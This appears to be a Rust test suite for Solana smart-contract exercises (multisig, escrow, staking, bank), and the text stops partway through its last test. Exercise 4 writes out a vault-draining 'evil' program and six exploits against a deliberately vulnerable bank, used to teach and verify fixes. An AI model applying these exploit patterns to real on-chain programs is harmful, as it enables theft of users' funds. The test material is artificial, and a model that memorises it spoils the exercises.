use crate::sut::ex04_security::{self as bank, BankError, secure_id, vulnerable_id};
use crate::sut::{
    bonus_governance, ex01_multisig as ms, ex02_escrow as escrow, ex03_staking as staking,
};
use borsh::BorshDeserialize;
use solana_program::account_info::AccountInfo;
use solana_program::entrypoint::ProgramResult;
use solana_program::native_token::LAMPORTS_PER_SOL as SOL;
use solana_program::program::invoke;
use solana_program::program_error::ProgramError;
use solana_program::pubkey::Pubkey;
use solana_system_interface::instruction as system_instruction;
use solsim::{Account, Sim, TxError, TxMeta, token};

fn sim() -> Sim {
    let mut sim = Sim::new();
    sim.add_program(ms::ID, ms::process);
    sim.add_program(escrow::ID, escrow::process);
    sim.add_program(staking::ID, staking::process);
    sim.add_program(vulnerable_id::ID, bank::vulnerable::process);
    sim.add_program(secure_id::ID, bank::secure::process);
    sim
}

#[track_caller]
fn assert_custom(result: Result<TxMeta, TxError>, code: impl Into<ProgramError>) {
    let expected = code.into();
    let err = result.expect_err("should fail");
    assert!(
        err.is_program_error(&expected),
        "expected {expected:?}, got {err}"
    );
}

// ---------------------------------------------------------------- Exercise 1

fn load_multisig(sim: &Sim, key: &Pubkey) -> ms::Multisig {
    ms::Multisig::deserialize(&mut sim.data(key)).unwrap()
}

fn load_proposal(sim: &Sim, key: &Pubkey) -> ms::Proposal {
    ms::Proposal::deserialize(&mut sim.data(key)).unwrap()
}

/// Three owners, threshold 2, the vault funded with 5 SOL.
fn multisig(sim: &mut Sim) -> (Pubkey, [Pubkey; 3]) {
    let owners = [
        sim.funded_wallet(SOL),
        sim.funded_wallet(SOL),
        sim.funded_wallet(SOL),
    ];
    sim.process_ix(ms::create(&owners[0], 1, &owners, 2), &[owners[0]])
        .unwrap();
    let multisig = ms::multisig_address(&owners[0], 1);
    sim.airdrop(&ms::vault_address(&multisig), 5 * SOL);
    (multisig, owners)
}

#[test]
fn ex1_create_validates_owners_and_threshold() {
    let mut sim = sim();
    let creator = sim.funded_wallet(SOL);
    let (a, b) = (Pubkey::new_unique(), Pubkey::new_unique());
    assert_custom(
        sim.process_ix(ms::create(&creator, 1, &[], 1), &[creator]),
        ms::MultisigError::InvalidOwners,
    );
    assert_custom(
        sim.process_ix(ms::create(&creator, 1, &[a, a], 1), &[creator]),
        ms::MultisigError::InvalidOwners,
    );
    let eleven: Vec<Pubkey> = (0..11).map(|_| Pubkey::new_unique()).collect();
    assert_custom(
        sim.process_ix(ms::create(&creator, 1, &eleven, 1), &[creator]),
        ms::MultisigError::InvalidOwners,
    );
    assert_custom(
        sim.process_ix(ms::create(&creator, 1, &[a, b], 0), &[creator]),
        ms::MultisigError::InvalidThreshold,
    );
    assert_custom(
        sim.process_ix(ms::create(&creator, 1, &[a, b], 3), &[creator]),
        ms::MultisigError::InvalidThreshold,
    );

    sim.process_ix(ms::create(&creator, 1, &[a, b], 2), &[creator])
        .unwrap();
    let key = ms::multisig_address(&creator, 1);
    let state = load_multisig(&sim, &key);
    assert_eq!(
        (
            state.owners.as_slice(),
            state.threshold,
            state.proposal_count
        ),
        (&[a, b][..], 2, 0)
    );
    assert_eq!(sim.account(&key).unwrap().owner, ms::ID);
    assert_eq!(sim.data(&key).len(), ms::Multisig::SPACE);
}

#[test]
fn ex1_stored_instructions_round_trip() {
    let (a, b) = (Pubkey::new_unique(), Pubkey::new_unique());
    let ix = system_instruction::transfer(&a, &b, 7);
    let stored = ms::StoredInstruction::from(&ix);
    assert_eq!(stored.program_id, ix.program_id);
    assert_eq!(
        stored.accounts[0],
        ms::StoredMeta {
            pubkey: a,
            is_signer: true,
            is_writable: true
        }
    );
    assert_eq!(stored.to_instruction(), ix);
}

#[test]
fn ex1_propose_approve_execute_a_transfer() {
    let mut sim = sim();
    let (multisig, owners) = multisig(&mut sim);
    let vault = ms::vault_address(&multisig);
    let recipient = Pubkey::new_unique();
    let inner = system_instruction::transfer(&vault, &recipient, SOL);

    sim.process_ix(ms::propose(&owners[0], &multisig, 0, &inner), &[owners[0]])
        .unwrap();
    let proposal_key = ms::proposal_address(&multisig, 0);
    let proposal = load_proposal(&sim, &proposal_key);
    assert_eq!(
        (
            proposal.index,
            proposal.proposer,
            proposal.approvals.as_slice()
        ),
        (0, owners[0], &[owners[0]][..])
    );
    assert_eq!(proposal.instruction, ms::StoredInstruction::from(&inner));
    assert_eq!(load_multisig(&sim, &multisig).proposal_count, 1);

    let executor = sim.funded_wallet(SOL);
    assert_custom(
        sim.process_ix(ms::execute(&executor, &multisig, 0, &inner), &[executor]),
        ms::MultisigError::NotEnoughApprovals,
    );
    sim.process_ix(ms::approve(&owners[2], &multisig, 0), &[owners[2]])
        .unwrap();
    sim.process_ix(ms::execute(&executor, &multisig, 0, &inner), &[executor])
        .unwrap();
    assert_eq!(sim.lamports(&recipient), SOL);
    assert_eq!(sim.lamports(&vault), 4 * SOL);
    assert!(load_proposal(&sim, &proposal_key).executed);
    assert_custom(
        sim.process_ix(ms::execute(&executor, &multisig, 0, &inner), &[executor]),
        ms::MultisigError::AlreadyExecuted,
    );
}

#[test]
fn ex1_only_owners_propose_and_approve_once() {
    let mut sim = sim();
    let (multisig, owners) = multisig(&mut sim);
    let stranger = sim.funded_wallet(SOL);
    let inner = system_instruction::transfer(&ms::vault_address(&multisig), &stranger, SOL);
    assert_custom(
        sim.process_ix(ms::propose(&stranger, &multisig, 0, &inner), &[stranger]),
        ms::MultisigError::NotAnOwner,
    );
    sim.process_ix(ms::propose(&owners[1], &multisig, 0, &inner), &[owners[1]])
        .unwrap();
    assert_custom(
        sim.process_ix(ms::approve(&stranger, &multisig, 0), &[stranger]),
        ms::MultisigError::NotAnOwner,
    );
    assert_custom(
        sim.process_ix(ms::approve(&owners[1], &multisig, 0), &[owners[1]]),
        ms::MultisigError::AlreadyApproved,
    );
    // a second proposal gets index 1
    sim.process_ix(ms::propose(&owners[0], &multisig, 1, &inner), &[owners[0]])
        .unwrap();
    assert_eq!(
        load_proposal(&sim, &ms::proposal_address(&multisig, 1)).index,
        1
    );
}

#[test]
fn ex1_proposals_and_vaults_are_bound_to_their_multisig() {
    let mut sim = sim();
    let (multisig_a, owners) = multisig(&mut sim);
    sim.process_ix(ms::create(&owners[0], 2, &owners, 1), &[owners[0]])
        .unwrap();
    let multisig_b = ms::multisig_address(&owners[0], 2);
    let inner = system_instruction::transfer(&ms::vault_address(&multisig_a), &owners[0], SOL);
    sim.process_ix(
        ms::propose(&owners[0], &multisig_a, 0, &inner),
        &[owners[0]],
    )
    .unwrap();

    // Approve A's proposal "as part of" B (threshold 1 there).
    let mut cross = ms::approve(&owners[1], &multisig_b, 0);
    cross.accounts[2].pubkey = ms::proposal_address(&multisig_a, 0);
    assert_custom(
        sim.process_ix(cross, &[owners[1]]),
        ms::MultisigError::WrongMultisig,
    );

    // Execute with someone else's "vault".
    sim.process_ix(ms::approve(&owners[1], &multisig_a, 0), &[owners[1]])
        .unwrap();
    let mut wrong_vault = ms::execute(&owners[2], &multisig_a, 0, &inner);
    wrong_vault.accounts[3].pubkey = ms::vault_address(&multisig_b);
    assert!(sim.process_ix(wrong_vault, &[owners[2]]).is_err());
}

#[test]
fn ex1_the_multisig_can_move_tokens_too() {
    let mut sim = sim();
    let (multisig, owners) = multisig(&mut sim);
    let vault = ms::vault_address(&multisig);
    let mint = token::create_mint(&mut sim, &owners[0], &owners[0], 0);
    let vault_tokens = token::create_ata(&mut sim, &owners[0], &vault, &mint);
    token::mint_to(&mut sim, &mint, &owners[0], &vault_tokens, 100);
    let recipient = token::create_ata(&mut sim, &owners[0], &owners[2], &mint);

    let inner = spl_token_interface::instruction::transfer(
        &spl_token_interface::ID,
        &vault_tokens,
        &recipient,
        &vault,
        &[],
        40,
    )
    .unwrap();
    sim.process_ix(ms::propose(&owners[0], &multisig, 0, &inner), &[owners[0]])
        .unwrap();
    sim.process_ix(ms::approve(&owners[1], &multisig, 0), &[owners[1]])
        .unwrap();
    sim.process_ix(ms::execute(&owners[1], &multisig, 0, &inner), &[owners[1]])
        .unwrap();
    assert_eq!(
        (
            token::balance(&sim, &vault_tokens),
            token::balance(&sim, &recipient)
        ),
        (60, 40)
    );
}

#[test]
fn ex1_approvals_by_removed_owners_do_not_count() {
    let p = ms::Proposal {
        multisig: Pubkey::default(),
        index: 0,
        proposer: Pubkey::default(),
        instruction: ms::StoredInstruction {
            program_id: Pubkey::default(),
            accounts: vec![],
            data: vec![],
        },
        approvals: vec![
            Pubkey::new_from_array([1; 32]),
            Pubkey::new_from_array([2; 32]),
        ],
        executed: false,
        bump: 0,
    };
    let m = ms::Multisig {
        creator: Pubkey::default(),
        id: 0,
        owners: vec![
            Pubkey::new_from_array([2; 32]),
            Pubkey::new_from_array([3; 32]),
        ],
        threshold: 1,
        proposal_count: 1,
        bump: 0,
        vault_bump: 0,
    };
    assert_eq!(p.approval_count(&m), 1);
}

// ---------------------------------------------------------------- Exercise 2

struct Market {
    maker: Pubkey,
    taker: Pubkey,
    mint_a: Pubkey,
    mint_b: Pubkey,
    maker_a: Pubkey,
    maker_b: Pubkey,
    taker_a: Pubkey,
    taker_b: Pubkey,
}

/// Maker holds 100 A, taker holds 100 B; both have accounts for both mints.
fn market(sim: &mut Sim) -> Market {
    let (maker, taker, issuer) = (
        sim.funded_wallet(SOL),
        sim.funded_wallet(SOL),
        sim.funded_wallet(SOL),
    );
    let mint_a = token::create_mint(sim, &issuer, &issuer, 6);
    let mint_b = token::create_mint(sim, &issuer, &issuer, 6);
    let maker_a = token::create_ata(sim, &issuer, &maker, &mint_a);
    let maker_b = token::create_ata(sim, &issuer, &maker, &mint_b);
    let taker_a = token::create_ata(sim, &issuer, &taker, &mint_a);
    let taker_b = token::create_ata(sim, &issuer, &taker, &mint_b);
    token::mint_to(sim, &mint_a, &issuer, &maker_a, 100);
    token::mint_to(sim, &mint_b, &issuer, &taker_b, 100);
    Market {
        maker,
        taker,
        mint_a,
        mint_b,
        maker_a,
        maker_b,
        taker_a,
        taker_b,
    }
}

fn make_offer(sim: &mut Sim, m: &Market, offer: u64, want: u64) -> Result<TxMeta, TxError> {
    sim.process_ix(
        escrow::make(
            &m.maker, 1, &m.mint_a, &m.mint_b, &m.maker_a, &m.maker_b, offer, want,
        ),
        &[m.maker],
    )
}

#[test]
fn ex2_make_locks_the_offer_in_a_pda_vault() {
    let mut sim = sim();
    let m = market(&mut sim);
    make_offer(&mut sim, &m, 30, 50).unwrap();
    let escrow_key = escrow::escrow_address(&m.maker, 1);
    let vault = escrow::vault_address(&escrow_key);
    assert_eq!(
        (
            token::balance(&sim, &m.maker_a),
            token::balance(&sim, &vault)
        ),
        (70, 30)
    );
    let vault_state = token::token_account_state(&sim, &vault).unwrap();
    assert_eq!(
        (vault_state.owner, vault_state.mint),
        (escrow_key, m.mint_a),
        "only the escrow PDA can move them"
    );
    let state = escrow::Escrow::deserialize(&mut sim.data(&escrow_key)).unwrap();
    assert_eq!(
        (
            state.maker,
            state.offer_amount,
            state.want_amount,
            state.maker_receive_b
        ),
        (m.maker, 30, 50, m.maker_b)
    );
}

#[test]
fn ex2_make_validates() {
    let mut sim = sim();
    let m = market(&mut sim);
    assert_custom(
        make_offer(&mut sim, &m, 0, 5),
        escrow::EscrowError::ZeroAmount,
    );
    assert_custom(
        make_offer(&mut sim, &m, 5, 0),
        escrow::EscrowError::ZeroAmount,
    );
    // maker's "A account" is actually a B account
    let ix = escrow::make(
        &m.maker, 1, &m.mint_a, &m.mint_b, &m.maker_b, &m.maker_b, 5, 5,
    );
    assert_custom(
        sim.process_ix(ix, &[m.maker]),
        escrow::EscrowError::WrongMint,
    );
    // the "maker's B account" belongs to the taker: the maker would never be paid
    let ix = escrow::make(
        &m.maker, 1, &m.mint_a, &m.mint_b, &m.maker_a, &m.taker_b, 5, 5,
    );
    assert_custom(
        sim.process_ix(ix, &[m.maker]),
        escrow::EscrowError::WrongTokenOwner,
    );
}

#[test]
fn ex2_take_swaps_atomically_and_closes_everything() {
    let mut sim = sim();
    let m = market(&mut sim);
    make_offer(&mut sim, &m, 30, 50).unwrap();
    let escrow_key = escrow::escrow_address(&m.maker, 1);
    let vault = escrow::vault_address(&escrow_key);
    let rent = sim.lamports(&escrow_key) + sim.lamports(&vault);
    let maker_lamports = sim.lamports(&m.maker);

    sim.process_ix(
        escrow::take(
            &m.taker,
            &m.maker,
            &escrow_key,
            &m.taker_a,
            &m.taker_b,
            &m.maker_b,
        ),
        &[m.taker],
    )
    .unwrap();
    assert_eq!(token::balance(&sim, &m.taker_a), 30);
    assert_eq!(token::balance(&sim, &m.taker_b), 50);
    assert_eq!(token::balance(&sim, &m.maker_b), 50);
    assert!(sim.account(&escrow_key).is_none() && sim.account(&vault).is_none());
    assert_eq!(
        sim.lamports(&m.maker),
        maker_lamports + rent,
        "all rent back to the maker"
    );
}

#[test]
fn ex2_take_cannot_redirect_or_underpay() {
    let mut sim = sim();
    let m = market(&mut sim);
    make_offer(&mut sim, &m, 30, 50).unwrap();
    let escrow_key = escrow::escrow_address(&m.maker, 1);
    // the taker names their own B account as "the maker's"
    let redirect = escrow::take(
        &m.taker,
        &m.maker,
        &escrow_key,
        &m.taker_a,
        &m.taker_b,
        &m.taker_b,
    );
    assert_custom(
        sim.process_ix(redirect, &[m.taker]),
        escrow::EscrowError::EscrowMismatch,
    );
    // receives into a B account
    let wrong_mint = escrow::take(
        &m.taker,
        &m.maker,
        &escrow_key,
        &m.taker_b,
        &m.taker_b,
        &m.maker_b,
    );
    assert_custom(
        sim.process_ix(wrong_mint, &[m.taker]),
        escrow::EscrowError::WrongMint,
    );

    // a taker who can't pay: the whole swap fails, nothing moves
    let poor = sim.funded_wallet(SOL);
    let poor_a = token::create_ata(&mut sim, &poor, &poor, &m.mint_a);
    let poor_b = token::create_ata(&mut sim, &poor, &poor, &m.mint_b);
    assert!(
        sim.process_ix(
            escrow::take(&poor, &m.maker, &escrow_key, &poor_a, &poor_b, &m.maker_b),
            &[poor]
        )
        .is_err()
    );
    assert_eq!(
        token::balance(&sim, &escrow::vault_address(&escrow_key)),
        30
    );
}

#[test]
fn ex2_only_the_maker_cancels() {
    let mut sim = sim();
    let m = market(&mut sim);
    make_offer(&mut sim, &m, 30, 50).unwrap();
    let escrow_key = escrow::escrow_address(&m.maker, 1);
    assert_custom(
        sim.process_ix(
            escrow::cancel(&m.taker, &escrow_key, &m.taker_a),
            &[m.taker],
        ),
        escrow::EscrowError::NotTheMaker,
    );
    sim.process_ix(
        escrow::cancel(&m.maker, &escrow_key, &m.maker_a),
        &[m.maker],
    )
    .unwrap();
    assert_eq!(token::balance(&sim, &m.maker_a), 100);
    assert!(sim.account(&escrow_key).is_none());
}

// ---------------------------------------------------------------- Exercise 3

fn pool_state(rate: u64, total: u64, rpt: u128, last: i64) -> staking::Pool {
    staking::Pool {
        admin: Pubkey::default(),
        stake_mint: Pubkey::default(),
        reward_mint: Pubkey::default(),
        reward_rate: rate,
        total_staked: total,
        reward_per_token: rpt,
        last_update: last,
        bump: 0,
        vault_bump: 0,
    }
}

#[test]
fn ex3_accrue_and_settle() {
    let mut pool = pool_state(10, 100, 0, 1_000);
    staking::accrue(&mut pool, 1_010).unwrap();
    // 10 s * 10/s = 100 rewards over 100 staked = 1 per token
    assert_eq!(
        (pool.reward_per_token, pool.last_update),
        (staking::PRECISION, 1_010)
    );
    staking::accrue(&mut pool, 1_005).unwrap(); // the clock never runs backwards
    assert_eq!(
        (pool.reward_per_token, pool.last_update),
        (staking::PRECISION, 1_010)
    );

    let mut empty = pool_state(10, 0, 0, 0);
    staking::accrue(&mut empty, 100).unwrap();
    assert_eq!(
        (empty.reward_per_token, empty.last_update),
        (0, 100),
        "nothing staked, nothing accrues"
    );

    let mut stake = staking::StakeAccount {
        pool: Pubkey::default(),
        owner: Pubkey::default(),
        amount: 25,
        reward_per_token_paid: 0,
        pending: 3,
        bump: 0,
    };
    staking::settle(&mut stake, staking::PRECISION * 2).unwrap();
    assert_eq!(
        (stake.pending, stake.reward_per_token_paid),
        (53, staking::PRECISION * 2)
    );
    staking::settle(&mut stake, staking::PRECISION * 2).unwrap();
    assert_eq!(stake.pending, 53, "settling twice pays once");

    let mut huge = pool_state(u64::MAX, 1, 0, 0);
    assert_eq!(
        staking::accrue(&mut huge, i64::MAX),
        Err(staking::StakingError::MathOverflow)
    );
}

proptest::proptest! {
    #[test]
    fn ex3_rewards_never_exceed_what_was_emitted(
        rate in 1u64..1_000_000,
        stakes in proptest::collection::vec(1u64..1_000_000_000, 1..5),
        seconds in 1i64..1_000_000,
    ) {
        let total: u64 = stakes.iter().sum();
        let mut pool = pool_state(rate, total, 0, 0);
        staking::accrue(&mut pool, seconds).unwrap();
        let mut paid: u128 = 0;
        for amount in stakes {
            let mut stake = staking::StakeAccount { pool: Pubkey::default(), owner: Pubkey::default(), amount, reward_per_token_paid: 0, pending: 0, bump: 0 };
            staking::settle(&mut stake, pool.reward_per_token).unwrap();
            paid += stake.pending as u128;
        }
        let emitted = rate as u128 * seconds as u128;
        proptest::prop_assert!(paid <= emitted, "paid {} > emitted {}", paid, emitted);
        // rounding loses at most a little per staker
        proptest::prop_assert!(emitted - paid <= 1 + emitted / 1_000_000 + 5);
    }
}

struct Farm {
    admin: Pubkey,
    stake_mint: Pubkey,
    reward_mint: Pubkey,
}

fn farm(sim: &mut Sim, rate: u64) -> Farm {
    let admin = sim.funded_wallet(SOL);
    let stake_mint = token::create_mint(sim, &admin, &admin, 0);
    let pool = staking::pool_address(&stake_mint);
    let reward_mint = token::create_mint(sim, &admin, &pool, 0);
    sim.process_ix(
        staking::init_pool(&admin, &stake_mint, &reward_mint, rate),
        &[admin],
    )
    .unwrap();
    Farm {
        admin,
        stake_mint,
        reward_mint,
    }
}

/// A user with `amount` stake tokens and an empty reward account.
fn staker(sim: &mut Sim, f: &Farm, amount: u64) -> (Pubkey, Pubkey, Pubkey) {
    let user = sim.funded_wallet(SOL);
    let tokens = token::create_ata(sim, &f.admin, &user, &f.stake_mint);
    token::mint_to(sim, &f.stake_mint, &f.admin, &tokens, amount);
    let rewards = token::create_ata(sim, &f.admin, &user, &f.reward_mint);
    (user, tokens, rewards)
}

#[test]
fn ex3_init_pool_requires_the_pool_to_mint_rewards() {
    let mut sim = sim();
    let admin = sim.funded_wallet(SOL);
    let stake_mint = token::create_mint(&mut sim, &admin, &admin, 0);
    let reward_mint = token::create_mint(&mut sim, &admin, &admin, 0);
    let result = sim.process_ix(
        staking::init_pool(&admin, &stake_mint, &reward_mint, 10),
        &[admin],
    );
    assert_custom(result, staking::StakingError::InvalidRewardMint);
}

#[test]
fn ex3_a_lone_staker_earns_the_whole_emission() {
    let mut sim = sim();
    let f = farm(&mut sim, 10);
    let (user, tokens, rewards) = staker(&mut sim, &f, 100);
    sim.process_ix(staking::stake(&user, &f.stake_mint, &tokens, 100), &[user])
        .unwrap();
    let pool = staking::pool_address(&f.stake_mint);
    assert_eq!(token::balance(&sim, &staking::vault_address(&pool)), 100);
    sim.advance_time(60);
    sim.process_ix(
        staking::claim(&user, &f.stake_mint, &f.reward_mint, &rewards),
        &[user],
    )
    .unwrap();
    assert_eq!(token::balance(&sim, &rewards), 600);
    // claiming again right away pays nothing more
    sim.process_ix(
        staking::claim(&user, &f.stake_mint, &f.reward_mint, &rewards),
        &[user],
    )
    .unwrap();
    assert_eq!(token::balance(&sim, &rewards), 600);
}

#[test]
fn ex3_rewards_are_shared_in_proportion() {
    let mut sim = sim();
    let f = farm(&mut sim, 100);
    let (alice, a_tokens, a_rewards) = staker(&mut sim, &f, 100);
    let (bob, b_tokens, b_rewards) = staker(&mut sim, &f, 300);
    sim.process_ix(
        staking::stake(&alice, &f.stake_mint, &a_tokens, 100),
        &[alice],
    )
    .unwrap();
    sim.advance_time(10); // alice alone: 1000
    sim.process_ix(staking::stake(&bob, &f.stake_mint, &b_tokens, 300), &[bob])
        .unwrap();
    sim.advance_time(10); // 1000 split 1:3
    sim.process_ix(
        staking::claim(&alice, &f.stake_mint, &f.reward_mint, &a_rewards),
        &[alice],
    )
    .unwrap();
    sim.process_ix(
        staking::claim(&bob, &f.stake_mint, &f.reward_mint, &b_rewards),
        &[bob],
    )
    .unwrap();
    assert_eq!(token::balance(&sim, &a_rewards), 1000 + 250);
    assert_eq!(token::balance(&sim, &b_rewards), 750);
}

#[test]
fn ex3_unstake_returns_tokens_and_stops_rewards() {
    let mut sim = sim();
    let f = farm(&mut sim, 10);
    let (user, tokens, rewards) = staker(&mut sim, &f, 100);
    sim.process_ix(staking::stake(&user, &f.stake_mint, &tokens, 100), &[user])
        .unwrap();
    sim.advance_time(5);
    assert_custom(
        sim.process_ix(
            staking::unstake(&user, &f.stake_mint, &tokens, 101),
            &[user],
        ),
        staking::StakingError::InsufficientStake,
    );
    assert_custom(
        sim.process_ix(staking::unstake(&user, &f.stake_mint, &tokens, 0), &[user]),
        staking::StakingError::ZeroAmount,
    );
    sim.process_ix(
        staking::unstake(&user, &f.stake_mint, &tokens, 100),
        &[user],
    )
    .unwrap();
    assert_eq!(token::balance(&sim, &tokens), 100);
    sim.advance_time(1000);
    sim.process_ix(
        staking::claim(&user, &f.stake_mint, &f.reward_mint, &rewards),
        &[user],
    )
    .unwrap();
    assert_eq!(
        token::balance(&sim, &rewards),
        50,
        "only the 5 staked seconds"
    );
}

#[test]
fn ex3_stake_accounts_are_personal() {
    let mut sim = sim();
    let f = farm(&mut sim, 10);
    let (victim, v_tokens, _) = staker(&mut sim, &f, 100);
    let (thief, t_tokens, t_rewards) = staker(&mut sim, &f, 1);
    sim.process_ix(
        staking::stake(&victim, &f.stake_mint, &v_tokens, 100),
        &[victim],
    )
    .unwrap();
    sim.advance_time(10);
    let pool = staking::pool_address(&f.stake_mint);
    let victims_stake = staking::stake_account_address(&pool, &victim);
    let mut unstake = staking::unstake(&thief, &f.stake_mint, &t_tokens, 100);
    unstake.accounts[2].pubkey = victims_stake;
    assert_custom(
        sim.process_ix(unstake, &[thief]),
        staking::StakingError::NotTheStaker,
    );
    let mut claim = staking::claim(&thief, &f.stake_mint, &f.reward_mint, &t_rewards);
    claim.accounts[2].pubkey = victims_stake;
    assert_custom(
        sim.process_ix(claim, &[thief]),
        staking::StakingError::NotTheStaker,
    );
}

// ---------------------------------------------------------------- Exercise 4

/// An attacker's program: given an account that signed the CPI (the vault),
/// it takes everything in it.
fn evil(_program_id: &Pubkey, accounts: &[AccountInfo], _data: &[u8]) -> ProgramResult {
    let (vault, thief) = (&accounts[0], &accounts[1]);
    let everything = vault.lamports();
    invoke(
        &system_instruction::transfer(vault.key, thief.key, everything),
        &[vault.clone(), thief.clone()],
    )
}

/// A bank with an admin and a victim who deposited 10 SOL; an attacker with
/// their own (empty) deposit account and 1 SOL.
struct BankSetup {
    program: Pubkey,
    victim: Pubkey,
    attacker: Pubkey,
    vault: Pubkey,
}

fn bank_setup(sim: &mut Sim, program: Pubkey) -> BankSetup {
    let admin = sim.funded_wallet(SOL);
    sim.process_ix(bank::init(&program, &admin), &[admin])
        .unwrap();
    let victim = sim.funded_wallet(20 * SOL);
    sim.process(
        &[
            bank::open(&program, &victim),
            bank::deposit(&program, &victim, 10 * SOL),
        ],
        &[victim],
    )
    .unwrap();
    let attacker = sim.funded_wallet(SOL);
    sim.process_ix(bank::open(&program, &attacker), &[attacker])
        .unwrap();
    BankSetup {
        program,
        victim,
        attacker,
        vault: bank::vault_address(&program),
    }
}

/// Run `exploit` against both programs: it must drain the vulnerable bank
/// and fail against the secure one.
fn check_exploit(exploit: impl Fn(&mut Sim, &BankSetup) -> Result<TxMeta, TxError>) {
    let mut sim = sim();
    sim.add_program(EVIL, evil);
    let s = bank_setup(&mut sim, vulnerable_id::ID);
    let before = sim.lamports(&s.attacker);
    exploit(&mut sim, &s).expect("the exploit works on the vulnerable bank");
    assert!(
        sim.lamports(&s.attacker) >= before + 9 * SOL,
        "the attacker took the vault"
    );

    let mut sim = self::sim();
    sim.add_program(EVIL, evil);
    let s = bank_setup(&mut sim, secure_id::ID);
    let (vault_before, attacker_before) = (sim.lamports(&s.vault), sim.lamports(&s.attacker));
    let result = exploit(&mut sim, &s);
    assert!(result.is_err(), "the secure bank must refuse it");
    // (an exploit may make an honest deposit first: the vault can only grow)
    assert!(sim.lamports(&s.vault) >= vault_before);
    assert!(sim.lamports(&s.attacker) <= attacker_before);
}

const EVIL: Pubkey = Pubkey::new_from_array([66; 32]);

fn load_deposit(sim: &Sim, program: &Pubkey, owner: &Pubkey) -> bank::Deposit {
    bank::Deposit::deserialize(&mut sim.data(&bank::deposit_address(program, owner))).unwrap()
}

#[test]
fn ex4_honest_use_of_the_secure_bank() {
    let mut sim = sim();
    let program = secure_id::ID;
    let s = bank_setup(&mut sim, program);
    assert_eq!(load_deposit(&sim, &program, &s.victim).balance, 10 * SOL);
    assert_eq!(sim.lamports(&s.vault), 10 * SOL);
    sim.process_ix(bank::withdraw(&program, &s.victim, 3 * SOL), &[s.victim])
        .unwrap();
    sim.process_ix(
        bank::transfer(&program, &s.victim, &s.attacker, SOL),
        &[s.victim],
    )
    .unwrap();
    assert_eq!(load_deposit(&sim, &program, &s.victim).balance, 6 * SOL);
    assert_eq!(load_deposit(&sim, &program, &s.attacker).balance, SOL);
    assert_custom(
        sim.process_ix(bank::withdraw(&program, &s.victim, 7 * SOL), &[s.victim]),
        BankError::InsufficientBalance,
    );
    assert_custom(
        sim.process_ix(
            bank::transfer(&program, &s.victim, &s.attacker, 7 * SOL),
            &[s.victim],
        ),
        BankError::InsufficientBalance,
    );
}

#[test]
fn ex4_the_admin_can_still_sweep() {
    let mut sim = sim();
    let program = secure_id::ID;
    let admin = sim.funded_wallet(SOL);
    sim.process_ix(bank::init(&program, &admin), &[admin])
        .unwrap();
    sim.airdrop(&bank::vault_address(&program), 2 * SOL);
    let before = sim.lamports(&admin);
    sim.process_ix(bank::admin_withdraw(&program, &admin, SOL), &[admin])
        .unwrap();
    assert_eq!(sim.lamports(&admin), before + SOL);
    let stranger = sim.funded_wallet(SOL);
    let mut not_admin = bank::admin_withdraw(&program, &stranger, SOL);
    not_admin.accounts[3].pubkey = stranger;
    assert_custom(
        sim.process_ix(not_admin, &[stranger]),
        BankError::NotTheAdmin,
    );
}

#[test]
fn ex4_bug1_missing_signer_check() {
    check_exploit(|sim, s| {
        // Withdraw from the victim's deposit, naming the victim as owner --
        // without their signature -- and paying the attacker.
        let mut ix = bank::withdraw(&s.program, &s.victim, 10 * SOL);
        ix.accounts[0].is_signer = false;
        ix.accounts[3].pubkey = s.attacker;
        sim.process_ix(ix, &[s.attacker])
    });
}

#[test]
fn ex4_bug2_missing_owner_check() {
    check_exploit(|sim, s| {
        // A "bank" account the attacker made, owned by the attacker's program.
        let fake = Pubkey::new_unique();
        let data = borsh::to_vec(&bank::Bank {
            tag: bank::BANK_TAG,
            admin: s.attacker,
            bump: 0,
        })
        .unwrap();
        sim.set_account(fake, Account::new_rent_exempt(data, EVIL));
        let mut ix = bank::admin_withdraw(&s.program, &s.attacker, 10 * SOL);
        ix.accounts[1].pubkey = fake;
        sim.process_ix(ix, &[s.attacker])
    });
}

#[test]
fn ex4_bug3_type_confusion() {
    check_exploit(|sim, s| {
        // The attacker's own deposit account, passed as the bank.
        let mut ix = bank::admin_withdraw(&s.program, &s.attacker, 10 * SOL);
        ix.accounts[1].pubkey = bank::deposit_address(&s.program, &s.attacker);
        sim.process_ix(ix, &[s.attacker])
    });
}

#[test]
fn ex4_bug4_arbitrary_cpi() {
    check_exploit(|sim, s| {
        // Deposit 1 lamport, withdraw it -- through the attacker's "system program".
        sim.process_ix(
            bank::deposit(&s.program, &s.attacker, 1_000_000),
            &[s.attacker],
        )?;
        let mut ix = bank::withdraw(&s.program, &s.attacker, 1);
        ix.accounts[4].pubkey = EVIL;
        sim.process_ix(ix, &[s.attacker])
    });
}

#[test]
fn ex4_bug5_integer_underflow() {
    check_exploit(|sim, s| {
        // 0 - 1 wraps to u64::MAX; then withdraw the whole vault.
        sim.process_ix(
            bank::transfer(&s.program, &s.attacker, &s.victim, 1),
            &[s.attacker],
        )?;
        let vault = sim.lamports(&s.vault);
        sim.process_ix(
            bank::withdraw(&s.program, &s.attacker, vault),
            &[s.attacker],
        )
    });
}

#[test]
fn ex4_bug6_duplicate_mutable_accounts() {
    check_exploit(|sim, s| {
        // Transfer to yourself: each round adds the amount out of nothing.
        sim.process_ix(
            bank::deposit(&s.program, &s.attacker, SOL / 2),
            &[s.attacker],
        )?;
        let mut balance = SOL / 2;
        while balance < 11 * SOL {
            sim.process_ix(
                bank::transfer(&s.program, &s.attacker, &s.attacker, balance),
                &[s.attacker],
            )?;
            balance *= 2;
        }
        let vault = sim.lamports(&s.vault);
        sim.process_ix(
            bank::withdraw(&s.program, &s.attacker, vault),
            &[s.attacker],
        )
    });
}

// --------------------------------------------------------------------- Bonus

#[test]
fn bonus_the_threshold_changes_only_through_a_proposal() {
    let mut sim = sim();
    let (multisig, owners) = multisig(&mut sim);
    let change = bonus_governance::set_threshold(&multisig, 3);
    // calling it directly: nobody can sign as the vault
    let mut direct = change.clone();
    direct.accounts[0].is_signer = false;
    assert_custom(
        sim.process_ix(direct, &[owners[0]]),
        ProgramError::MissingRequiredSignature,
    );

    sim.process_ix(ms::propose(&owners[0], &multisig, 0, &change), &[owners[0]])
        .unwrap();
    sim.process_ix(ms::approve(&owners[1], &multisig, 0), &[owners[1]])
        .unwrap();
    sim.process_ix(ms::execute(&owners[2], &multisig, 0, &change), &[owners[2]])
        .unwrap();
    assert_eq!(load_multisig(&sim, &multisig).threshold, 3);

    // an invalid threshold, even approved, is rejected
    let bad = bonus_governance::set_threshold(&multisig, 4);
    sim.process_ix(ms::propose(&owners[0], &multisig, 1, &bad), &[owners[0]])
        .unwrap();
